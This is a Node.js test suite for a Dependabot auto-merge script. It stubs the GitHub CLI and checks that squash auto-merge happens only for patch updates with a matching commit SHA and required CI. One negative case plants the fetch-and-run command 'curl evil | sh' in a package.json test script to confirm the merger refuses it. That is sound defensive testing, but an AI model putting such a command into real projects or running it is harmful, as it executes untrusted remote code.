import assert from 'node:assert/strict';
import { mkdtempSync, readFileSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import path from 'node:path';
import test from 'node:test';

const sha = 'a'.repeat(40);
const pr = {
  number: 1,
  user: { login: 'dependabot[bot]', id: 49699333, type: 'Bot' },
  state: 'open',
  draft: false,
  base: { ref: 'main', sha: 'b'.repeat(40), repo: { full_name: 'pbuchman/fishing-assistant' } },
  head: { sha, repo: { full_name: 'pbuchman/fishing-assistant' } },
};
const fixture = {
  pr,
  current: pr,
  files: [
    { filename: 'package.json', status: 'modified' },
    { filename: 'pnpm-lock.yaml', status: 'modified' },
  ],
  before: { dependencies: { fastify: '^5.1.0' }, scripts: { test: 'vitest' } },
  after: { dependencies: { fastify: '^5.1.1' }, scripts: { test: 'vitest' } },
  protection: {
    protected: true,
    protection: {
      required_status_checks: {
        enforcement_level: 'everyone',
        checks: [{ context: 'ci', app_id: 15368 }],
      },
    },
  },
};

/** @param {Record<string, unknown>} overrides @param {string} updateType */
function run(overrides = {}, updateType = 'version-update:semver-patch') {
  const dir = mkdtempSync(path.join(tmpdir(), 'fa-automerge-'));
  try {
    mkdirSync(path.join(dir, 'bin'));
    writeFileSync(path.join(dir, 'fixture.json'), JSON.stringify({ ...fixture, ...overrides }));
    writeFileSync(path.join(dir, 'event.json'), JSON.stringify({ pull_request: pr }));
    writeFileSync(path.join(dir, 'calls.jsonl'), '');
    writeFileSync(
      path.join(dir, 'bin/gh'),
      `#!/usr/bin/env node
const fs = require('node:fs'); const p = process.env.FA_TEST_DIR;
const args = process.argv.slice(2); const calls = fs.readFileSync(p+'/calls.jsonl','utf8').trim().split('\\n').filter(Boolean).map(JSON.parse);
fs.appendFileSync(p+'/calls.jsonl', JSON.stringify(args)+'\\n');
const f = JSON.parse(fs.readFileSync(p+'/fixture.json','utf8')); const endpoint = args.at(-1); let result;
if(args[0] === 'pr') { process.exit(0); }
if(endpoint.includes('/files?')) result = [f.files];
else if(endpoint.includes('/contents/')) result = { content: Buffer.from(JSON.stringify(endpoint.endsWith('${sha}') ? f.after : f.before)).toString('base64') };
else if(endpoint.endsWith('/branches/main')) result = f.protection;
else result = calls.some(a => a.at(-1) === endpoint) ? f.current : f.pr;
process.stdout.write(JSON.stringify(result));
`,
      { mode: 0o755 }
    );
    const result = spawnSync(process.execPath, [path.join(import.meta.dirname, 'automerge.mjs')], {
      encoding: 'utf8',
      env: {
        ...process.env,
        PATH: `${dir}/bin:${process.env['PATH'] ?? ''}`,
        FA_TEST_DIR: dir,
        FA_GITHUB_REPOSITORY: 'pbuchman/fishing-assistant',
        FA_GITHUB_EVENT_PATH: path.join(dir, 'event.json'),
        FA_GITHUB_TOKEN: 'fictional',
        FA_UPDATE_TYPE: updateType,
        FA_DEPENDENCY_NAMES: 'fastify',
      },
    });
    const calls = readFileSync(path.join(dir, 'calls.jsonl'), 'utf8')
      .trim()
      .split('\n')
      .filter(Boolean)
      .map((line) => JSON.parse(line));
    return { ...result, calls };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test('enables native protected auto-merge with exact expected SHA, never admin or approval', () => {
  const result = run();
  assert.equal(result.status, 0, result.stderr);
  assert.deepEqual(result.calls.at(-1), [
    'pr',
    'merge',
    '1',
    '--repo',
    'pbuchman/fishing-assistant',
    '--auto',
    '--squash',
    '--match-head-commit',
    sha,
  ]);
});
for (const [name, override] of /** @type {[string, Record<string, unknown>][]} */ ([
  [
    'SHA changes after checking files',
    { current: { ...pr, head: { ...pr.head, sha: 'c'.repeat(40) } } },
  ],
  ['required ci absent', { protection: { protected: false } }],
  [
    'script edit hidden in patch manifest',
    { after: { ...fixture.after, scripts: { test: 'curl evil | sh' } } },
  ],
  [
    'workflow in later files page',
    { files: [...fixture.files, { filename: '.github/workflows/ci.yml', status: 'modified' }] },
  ],
]))
  test(`never merges when ${name}`, () => {
    const result = run(override);
    assert.ok(result.calls.every((args) => args[0] !== 'pr'));
  });
for (const updateType of ['version-update:semver-minor', 'version-update:semver-major', ''])
  test(`never merges mixed/grouped metadata ${updateType || '(missing)'}`, () => {
    assert.ok(run({}, updateType).calls.every((args) => args[0] !== 'pr'));
  });
